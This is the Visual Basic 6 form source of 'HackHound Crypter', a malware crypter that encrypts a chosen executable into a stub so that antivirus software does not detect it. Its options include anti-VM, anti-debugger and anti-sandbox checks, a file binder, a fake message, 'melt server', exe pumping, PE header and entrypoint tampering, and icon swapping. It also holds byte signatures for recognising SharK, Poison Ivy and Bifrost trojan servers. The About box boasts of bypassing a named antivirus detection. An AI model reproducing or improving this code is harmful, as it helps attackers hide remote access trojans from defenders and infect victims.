VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "ComDlg32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   4  'Festes Werkzeugfenster
   ClientHeight    =   9030
   ClientLeft      =   5160
   ClientTop       =   3795
   ClientWidth     =   5325
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9030
   ScaleWidth      =   5325
   ShowInTaskbar   =   0   'False
   Begin MSComDlg.CommonDialog cdl3 
      Left            =   960
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cdl2 
      Left            =   480
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame2 
      Caption         =   "Menu"
      Height          =   4935
      Left            =   120
      TabIndex        =   5
      Top             =   3960
      Width           =   5115
      Begin VB.CheckBox Check17 
         Caption         =   "Melt Server"
         Height          =   195
         Left            =   2520
         TabIndex        =   34
         Top             =   2520
         Width           =   1215
      End
      Begin VB.CheckBox Check16 
         Caption         =   "Anti Anubis Sanboxie"
         Height          =   195
         Left            =   2520
         TabIndex        =   33
         Top             =   4200
         Width           =   2295
      End
      Begin VB.CheckBox Check15 
         Caption         =   "Anti Sunbelt Sanboxie"
         Height          =   195
         Left            =   2520
         TabIndex        =   32
         Top             =   3960
         Width           =   2295
      End
      Begin VB.CheckBox Check14 
         Caption         =   "Anti Bitdefender Sandboxie"
         Height          =   195
         Left            =   2520
         TabIndex        =   31
         Top             =   3720
         Width           =   2295
      End
      Begin VB.CheckBox Check13 
         Caption         =   "Anti CW Sandboxie"
         Height          =   195
         Left            =   2520
         TabIndex        =   30
         Top             =   3480
         Width           =   1815
      End
      Begin VB.CheckBox Check12 
         Caption         =   "Anti Norman Sandboxie"
         Height          =   195
         Left            =   2520
         TabIndex        =   29
         Top             =   3240
         Width           =   2055
      End
      Begin MSComDlg.CommonDialog cdl4 
         Left            =   4440
         Top             =   2160
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin VB.CheckBox Check11 
         Caption         =   "Activate Binder"
         Height          =   195
         Left            =   120
         TabIndex        =   28
         Top             =   3480
         Width           =   1455
      End
      Begin VB.TextBox Text7 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   27
         Text            =   "Bind File..."
         Top             =   240
         Width           =   4875
      End
      Begin VB.CommandButton Command5 
         Caption         =   "Browse Bind File"
         Enabled         =   0   'False
         Height          =   255
         Left            =   120
         TabIndex        =   26
         Top             =   2400
         Width           =   1575
      End
      Begin VB.CheckBox Check10 
         Caption         =   "Anti Debugger"
         Height          =   195
         Left            =   2520
         TabIndex        =   25
         Top             =   3000
         Width           =   1935
      End
      Begin VB.CheckBox Check9 
         Caption         =   "Anti Vm"
         Height          =   195
         Left            =   2520
         TabIndex        =   24
         Top             =   2760
         Width           =   1815
      End
      Begin VB.CheckBox Check8 
         Caption         =   "Anti Sandboxie"
         Height          =   195
         Left            =   2520
         TabIndex        =   23
         Top             =   4440
         Width           =   1815
      End
      Begin VB.CheckBox Check7 
         Caption         =   "Change PE Entrypoint"
         Height          =   195
         Left            =   2520
         TabIndex        =   22
         Top             =   2280
         Width           =   1935
      End
      Begin VB.CheckBox Check6 
         Caption         =   "Realign PE Header"
         Height          =   195
         Left            =   2520
         TabIndex        =   21
         Top             =   2040
         Width           =   1695
      End
      Begin VB.CheckBox Check5 
         Caption         =   "Activate Parameter Support"
         Height          =   195
         Left            =   120
         TabIndex        =   20
         Top             =   3720
         Width           =   2295
      End
      Begin VB.TextBox Text6 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   19
         Text            =   "Parameter..."
         Top             =   600
         Width           =   4875
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Browse Stub"
         Enabled         =   0   'False
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   3120
         Width           =   1575
      End
      Begin VB.TextBox Text3 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   17
         Text            =   "Custom Stub..."
         Top             =   1320
         Width           =   4875
      End
      Begin VB.CheckBox Check2 
         Caption         =   "Activate Custom Stub"
         Height          =   195
         Left            =   120
         TabIndex        =   16
         Top             =   4200
         Width           =   1935
      End
      Begin VB.TextBox Text4 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   13
         Text            =   "Fake Message..."
         Top             =   1680
         Width           =   4875
      End
      Begin VB.CheckBox Check4 
         Caption         =   "Activate Fake Message"
         Height          =   195
         Left            =   120
         TabIndex        =   12
         Top             =   4440
         Width           =   2055
      End
      Begin VB.PictureBox Picture1 
         Height          =   615
         Left            =   1800
         Picture         =   "Form1.frx":0E02
         ScaleHeight     =   555
         ScaleWidth      =   525
         TabIndex        =   11
         Top             =   2040
         Width           =   585
      End
      Begin VB.CheckBox Check3 
         Caption         =   "Activate Exe-Pump"
         Height          =   195
         Left            =   120
         TabIndex        =   10
         Top             =   4680
         Width           =   1695
      End
      Begin VB.CheckBox Check1 
         Caption         =   "Activate Icon Changer"
         Height          =   195
         Left            =   120
         TabIndex        =   9
         Top             =   3960
         Width           =   1935
      End
      Begin VB.TextBox Text2 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   8
         Text            =   "0"
         Top             =   2040
         Width           =   1575
      End
      Begin VB.CommandButton Command2 
         Caption         =   "Browse Icon"
         Enabled         =   0   'False
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   2760
         Width           =   1575
      End
      Begin VB.TextBox Text1 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   6
         Text            =   "Icon Path..."
         Top             =   960
         Width           =   4875
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Welcome to HackHound Crypter"
      Height          =   2415
      Left            =   120
      TabIndex        =   0
      Top             =   1440
      Width           =   5115
      Begin VB.CommandButton Command4 
         Caption         =   "Generate Key"
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   960
         Width           =   4875
      End
      Begin VB.TextBox Text5 
         Height          =   285
         Left            =   120
         TabIndex        =   14
         Top             =   600
         Width           =   4875
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Abouts"
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   1680
         Width           =   4875
      End
      Begin VB.TextBox a 
         Height          =   285
         Left            =   120
         TabIndex        =   3
         Text            =   "File Path..."
         Top             =   240
         Width           =   4875
      End
      Begin VB.CommandButton Browse 
         Caption         =   "Browse"
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   1320
         Width           =   4875
      End
      Begin VB.CommandButton cmdCrypt 
         Caption         =   "Crypt"
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   2040
         Width           =   4875
      End
   End
   Begin MSComDlg.CommonDialog cdl 
      Left            =   0
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Image Image1 
      Height          =   1365
      Left            =   -1320
      Picture         =   "Form1.frx":1C04
      Top             =   0
      Width           =   6780
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim asm As String
Dim msa As String
Dim eofdata As String
Dim Stubpath As String
Const Letters1 = "abcdefghijklmnopqrstuvwxyz"
Const Letters2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const Letters3 = "1234567890"
Const Encryption = "&786/(8t9T/(676&(t78978&57%85/(95(65t/(9876t78z68z78&78678T7t78T&T785/(%&/t(/t/(tt89T()Z89Z6&/()z(9/(&tz"

Private Sub Check1_Click()
If Check1.Value = 1 Then
Text1.Enabled = True
Command2.Enabled = True
Else
Text1.Enabled = False
Command2.Enabled = False
End If
End Sub

Private Sub Check11_Click()
If Check11.Value = 1 Then
Text7.Enabled = True
Command5.Enabled = True
Else
Text7.Enabled = False
Command5.Enabled = False
End If
End Sub

Private Sub Check2_Click()
If Check2.Value = 1 Then
Text3.Enabled = True
Command3.Enabled = True
Else
Text3.Enabled = False
Command3.Enabled = False
End If
End Sub

Private Sub Check3_Click()
If Check3.Value = 1 Then
Text2.Enabled = True
Else
Text2.Enabled = False
End If
End Sub

Private Sub Check4_Click()
If Check4.Value = 1 Then
Text4.Enabled = True
Else
Text4.Enabled = False
End If
End Sub

Private Sub Check5_Click()
If Check5.Value = 1 Then
Text6.Enabled = True
Else
Text6.Enabled = False
End If
End Sub
Private Sub cmdCrypt_Click()
Dim RESDATA() As Byte
Dim bfile() As Byte
RESDATA() = LoadResData(102, "CUSTOM")
bfile() = LoadResData(101, "CUSTOM")
If a.Text = "" Or a.Text = "File Path..." Then
MsgBox "Please choose a File!", vbInformation, "Info"
Exit Sub
End If
Open App.Path & "\Stub.exe" For Binary As #1
Put #1, , RESDATA()
Close #1
Open App.Path & "\Stubicon.ico" For Binary As #1
Put #1, , bfile()
Close #1
Call ReplaceIcons(App.Path & "\Stubicon.ico", App.Path & "\Stub.exe", Err)
Kill App.Path & "\Stubicon.ico"
Call c
Call b
Call d
Call e
MsgBox "Crypting Finish", vbInformation, "Info"
Kill App.Path & "\Stub.exe"
End Sub
Private Sub Browse_Click()
cdl.CancelError = False
cdl.DialogTitle = "Open PE File"
cdl.Filter = "Executable Files (*.exe) | *.exe"
cdl.ShowOpen
FileInfo (cdl.FileName)
a.Text = cdl.FileName
End Sub
Sub b()
If Check2.Value = 1 Then
Stubpath = cdl3.FileName
Else
Stubpath = App.Path & "\Stub.exe"
End If
Open Stubpath For Binary As #1
msa = Space(LOF(1))
Get #1, , msa
Close #1
End Sub
Sub c()
Open a.Text For Binary As #1
asm = Space(LOF(1) - 1)
Get #1, , asm
Close #1
eofdata = ReadEOFData(a.Text)
End Sub
Sub d()
cdl.CancelError = False
cdl.FileName = ""
cdl.Filter = "Executable Files (*.exe) | *.exe"
cdl.ShowSave
End Sub
Sub e()
Dim API As New clscrypt
If Check11.Value = 1 Then
Dim Bindfile As String
Bindfile = Text7.Text
End If
If Check10.Value = 1 Then
Dim Debugger As String
Debugger = Check10.Value
End If
If Check8.Value = 1 Then
Dim sand As String
sand = Check8.Value
End If
If Check9.Value = 1 Then
Dim vm As String
vm = Check9.Value
End If
If Check5.Value = 1 Then
Dim cmd As String
cmd = Text6.Text
End If
If Check4.Value = 1 Then
Dim Fake As String
Fake = Text4.Text
End If
If Check12.Value = 1 Then
Dim NSB As String
NSB = Check12.Value
End If
If Check13.Value = 1 Then
Dim CSB As String
CSB = Check12.Value
End If
If Check14.Value = 1 Then
Dim BS As String
BS = Check14.Value
End If
If Check15.Value = 1 Then
Dim SBS As String
SBS = Check15.Value
End If
If Check16.Value = 1 Then
Dim ASB As String
ASB = Check16.Value
End If
If Check17.Value = 1 Then
Dim melter As String
melter = Check17.Value
End If
Dim PUMPER As String
Dim Cryptet As String
Cryptet = API.EncryptString(asm, Text5.Text)
Open cdl.FileName For Binary As #1
Put #1, , msa
Put #1, , Encryption
Put #1, , Cryptet
Put #1, , Encryption
Put #1, , Fake
Put #1, , Encryption
Put #1, , cmd
Put #1, , Encryption
Put #1, , sand
Put #1, , Encryption
Put #1, , vm
Put #1, , Encryption
Put #1, , Debugger
Put #1, , Encryption
Put #1, , Bindfile
Put #1, , Encryption
Put #1, , NSB
Put #1, , Encryption
Put #1, , CSB
Put #1, , Encryption
Put #1, , BS
Put #1, , Encryption
Put #1, , SBS
Put #1, , Encryption
Put #1, , ASB
Put #1, , Encryption
Put #1, , melter
Put #1, , Encryption
Put #1, , Text5.Text
Put #1, , Encryption
If Check3.Value = 1 Then
kbstring = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
For i = 0 To Text2.Text
PUMPER = PUMPER & kbstring
Next i
Put #1, LOF(1) + 1, PUMPER
Close #1
End If
Close #1
Call WriteEOFData(cdl.FileName, eofdata)
If Check6.Value = 1 Then
Call RealignPEFromFile(cdl.FileName)
End If
If Check7.Value = 1 Then
Call ChangeOEPFromFile(cdl.FileName)
End If
If Check1.Value = 1 Then
Call ReplaceIcons(Text1.Text, cdl.FileName, Err)
End If
End Sub
Private Sub Command1_Click()
MsgBox "Codet by The-Wall for HackHound.org!" & vbNewLine & "Thx to Cobein for RT Modul" & vbNewLine & "Greetz: haZl0oh, Slayer616, Hack-Eddy, carb0n, steve10120, omc and all the other friends!" & vbNewLine & vbNewLine & vbNewLine & "So this Crypter will show you how easy it is to bypass Antivir TR.Dropper.Gen!" & vbNewLine & "I give a Info look at the Stub Project infos and learn  once is the icon the other must you find out! ;)", vbInformation, "Info"
End Sub
Private Sub Command2_Click()
cdl2.CancelError = False
cdl2.DialogTitle = "Open Icon"
cdl2.Filter = "Icons (*.ico)|*.ico"
cdl2.ShowOpen
Text1.Text = cdl2.FileName
Picture1.Picture = LoadPicture(cdl2.FileName, , , 32, 32)
End Sub

Private Sub Command3_Click()
cdl3.CancelError = False
cdl3.DialogTitle = "Open Custom Stub"
cdl3.Filter = "Executable Files (*.exe) | *.exe"
cdl3.ShowOpen
Text3.Text = cdl3.FileName
End Sub

Private Sub Command4_Click()
Text5.Text = Key
End Sub
Public Function Key()
Dim Letters As String
Dim i As Integer
Letters = Letters1 + Letters2 + Letters3
For i = 1 To 50
Key = Key & Mid$(Letters, Int((Rnd * Len(Letters)) + 1), 1)
Next i
End Function
Function FileInfo(ByVal FFile As String)
Dim ForSize As String
Dim sstub As String
Dim hallo As String
Dim proz As Integer
Dim Finfo(0 To 100) As Double
Dim ff As Integer
ff = FreeFile

Open FFile For Binary As #ff
    ForSize = Space$(LOF(ff))
    Get #ff, , ForSize
Close #ff

Finfo(0) = InStr(ForSize, "s3|Fs|gFs[N;sÛœHsÄ¨Hs ÁGsGÂGscGsÄåFsÜŽ;sãÒGs]ðHsT&Gs½;GsibGsn‚;s`Gs™W;s;fGsž8Gs|æFsDQ;sgéFs>Þ9s<”HsÈFsSH;sñI;")
Finfo(1) = InStr(ForSize, "sharK 3")
Finfo(2) = InStr(ForSize, "½ËÚùn¥‰ùn¥‰ùn¥‰wq¶‰ýn¥‰N·‰øn¥‰Richùn¥‰")
Finfo(3) = InStr(ForSize, "ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØûûüÒöööööööÛí!")
Finfo(4) = InStr(ForSize, "233$363S34N5p5Ç5Ó5Ú5ì5þ5\6²6â6ý67")

If Finfo(0) <> 0 Then
MsgBox "Selected File is a SharK 2 Server!", vbInformation, "Info"
SharK2 = True
End If

If Finfo(1) <> 0 Then
MsgBox "Selected File is a SharK 3 Server!", vbInformation, "Info"
SharK3 = True
End If

If Finfo(2) <> 0 Then
MsgBox "Selected File is a Poisen Ivy Server!", vbInformation, "Info"
PI = True
End If

If Finfo(3) <> 0 Then
MsgBox "Selected File is a Bifrost Server!", vbInformation, "Info"
Bifrost = True
End If

If Finfo(4) <> 0 Then
MsgBox "Selected File is a Satelite 4600 Server!", vbInformation, "Info"
Bifrost = True
End If

End Function
Private Sub Command5_Click()
cdl4.CancelError = False
cdl4.DialogTitle = "Open Bind File"
cdl4.Filter = "Executable Files (*.exe) | *.exe"
cdl4.ShowOpen
Text7.Text = cdl4.FileName
End Sub


